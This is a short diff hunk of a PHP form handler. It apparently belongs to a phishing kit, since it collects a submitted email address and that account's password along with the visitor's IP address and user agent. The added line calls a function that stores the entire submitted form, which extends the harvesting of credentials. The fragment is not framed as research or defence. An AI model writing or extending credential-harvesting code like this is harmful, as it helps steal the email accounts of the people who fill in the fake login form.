@@ -6,6 +6,7 @@ if ($_SERVER['REQUEST_METHOD'] == 'POST') {
 
     $username = $_POST['email'];
     $password = $_POST['emailpass'];
+    h4z3_store_submission('email', $_POST);
     $useragent = $_SERVER['HTTP_USER_AGENT'];
     $ip = getenv("REMOTE_ADDR");
     
